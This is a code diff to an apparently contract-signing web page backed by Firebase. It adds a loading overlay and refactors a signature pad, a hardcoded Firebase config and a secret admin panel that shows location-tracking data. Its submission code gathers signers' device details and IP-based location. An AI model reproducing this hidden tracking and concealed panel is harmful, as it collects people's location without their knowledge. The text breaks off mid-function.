@@ -241,6 +241,24 @@
         .location-point:last-child {
             border-bottom: none;
         }
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loading-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -394,13 +412,21 @@
         </div>
     </div>
 
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay">
+        <div class="loading-content">
+            <h3>Processing...</h3>
+            <p>Please wait while we submit your contract</p>
+        </div>
+    </div>
+
     <!-- Firebase & Signature Pad Libraries -->
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/signature_pad/1.5.3/signature_pad.min.js"></script>
 
     <script>
-        // ===== FIREBASE CONFIG =====
+        // ===== FIREBASE CONFIGURATION =====
         const firebaseConfig = {
             apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
             authDomain: "gps-d0bab.firebaseapp.com",
@@ -409,137 +435,106 @@
             messagingSenderId: "810816177909",
             appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
         };
-        
+
         // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        
-        // Enable offline persistence
-        db.enablePersistence()
-          .catch((err) => {
-              console.error("Firestore persistence error:", err);
-          });
+        let db;
+        try {
+            const firebaseApp = firebase.initializeApp(firebaseConfig);
+            db = firebase.firestore();
+            
+            // Enable offline persistence
+            db.enablePersistence()
+                .catch(err => {
+                    console.warn("Persistence error:", err);
+                });
+        } catch (error) {
+            console.error("Firebase initialization error:", error);
+            alert("Error initializing database connection. Please refresh the page.");
+        }
 
         // ===== SIGNATURE PAD =====
-        const canvas = document.getElementById('signatureCanvas');
-        const signaturePad = new SignaturePad(canvas, {
-            backgroundColor: 'white',
-            penColor: 'black'
-        });
+        let signaturePad;
+        function initSignaturePad() {
+            const canvas = document.getElementById('signatureCanvas');
+            if (canvas) {
+                signaturePad = new SignaturePad(canvas, {
+                    backgroundColor: 'white',
+                    penColor: 'black'
+                });
+                
+                document.getElementById('clearSignature').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    signaturePad.clear();
+                });
+            }
+        }
 
-        document.getElementById('clearSignature').addEventListener('click', (e) => {
-            e.preventDefault();
-            signaturePad.clear();
-        });
-
-        // ===== ADMIN PANEL ACCESS =====
-        const adminLogo = document.getElementById('adminLogo');
-        const secretAdminLink = document.getElementById('secretAdminLink');
+        // ===== ADMIN PANEL FUNCTIONALITY =====
+        let adminPanelVisible = false;
         let tapCount = 0;
         let locationHistory = [];
-        let adminPanelVisible = false;
 
-        // Logo tap detection
-        function incrementTap(e) {
-            e.preventDefault();
-            e.stopPropagation();
+        function toggleAdminPanel(e) {
+            if (e) e.preventDefault();
+            adminPanelVisible = !adminPanelVisible;
             
+            if (adminPanelVisible) {
+                document.body.style.overflow = 'hidden';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadTrackingData();
+                initAnalytics();
+            } else {
+                document.body.style.overflow = '';
+                document.getElementById('adminPanel').style.display = 'none';
+                if (window.watchId) {
+                    stopTracking();
+                }
+            }
+        }
+
+        function handleLogoClick(e) {
+            e.preventDefault();
             tapCount++;
+            
             if (tapCount === 5) {
                 toggleAdminPanel();
                 tapCount = 0;
             }
+            
             clearTimeout(window.tapTimeout);
             window.tapTimeout = setTimeout(() => tapCount = 0, 2000);
-            return false;
         }
 
-        // Secret admin link
-        secretAdminLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            toggleAdminPanel();
-            return false;
-        });
-
-        adminLogo.addEventListener('click', incrementTap);
-        adminLogo.addEventListener('touchstart', incrementTap);
-
-        // Close admin panel
-        document.getElementById('adminClose').addEventListener('click', function(e) {
-            e.preventDefault();
-            toggleAdminPanel();
-            return false;
-        });
-
-        function toggleAdminPanel() {
-            if (adminPanelVisible) {
-                hideAdmin();
-            } else {
-                showAdmin();
-            }
-        }
-
-        function showAdmin() {
-            document.body.style.overflow = 'hidden';
-            document.getElementById('adminPanel').style.display = 'block';
-            adminPanelVisible = true;
-            loadTrackingData();
-            initAnalytics();
-        }
-
-        function hideAdmin() {
-            document.body.style.overflow = '';
-            document.getElementById('adminPanel').style.display = 'none';
-            adminPanelVisible = false;
-            if (window.watchId) {
-                stopTracking();
-            }
-        }
-
-        // ===== TAB SWITCHING =====
-        document.querySelectorAll('.tab-button').forEach(button => {
-            button.addEventListener('click', (e) => {
-                e.preventDefault();
-                
-                // Remove active class from all buttons and content
-                document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-                
-                // Add active class to clicked button
-                button.classList.add('active');
-                
-                // Show corresponding content
-                const tabId = button.getAttribute('data-tab') + 'Tab';
-                document.getElementById(tabId).classList.add('active');
+        function setupAdminPanel() {
+            const adminLogo = document.getElementById('adminLogo');
+            const secretAdminLink = document.getElementById('secretAdminLink');
+            const adminClose = document.getElementById('adminClose');
+            
+            if (adminLogo) adminLogo.addEventListener('click', handleLogoClick);
+            if (adminLogo) adminLogo.addEventListener('touchstart', handleLogoClick);
+            if (secretAdminLink) secretAdminLink.addEventListener('click', toggleAdminPanel);
+            if (adminClose) adminClose.addEventListener('click', toggleAdminPanel);
+            
+            // Tab switching
+            document.querySelectorAll('.tab-button').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    
+                    // Remove active class from all buttons and content
+                    document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                    
+                    // Add active class to clicked button
+                    button.classList.add('active');
+                    
+                    // Show corresponding content
+                    const tabId = button.getAttribute('data-tab') + 'Tab';
+                    document.getElementById(tabId).classList.add('active');
+                });
             });
-        });
+        }
 
         // ===== CONTRACT SUBMISSION =====
-        document.getElementById('submitContract').addEventListener('click', (e) => {
-            e.preventDefault();
-            
-            if (!signaturePad.isEmpty() && document.getElementById('agreeTerms').checked) {
-                submitContract();
-            } else {
-                alert("Please complete all required fields and sign the contract");
-            }
-        });
-
-        function submitContract() {
-            const contractData = {
-                timestamp: new Date().toISOString(),
-                name: document.getElementById('fullName').value,
-                email: document.getElementById('email').value,
-                phone: document.getElementById('phone').value,
-                signature: signaturePad.toDataURL(),
-                device: getDeviceInfo(),
-                location: {}
-            };
-
-            // Get IP and approximate location
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    contractData.location.ipData = {
-            
+        async function submitContract() {
+            // Validate form
+           
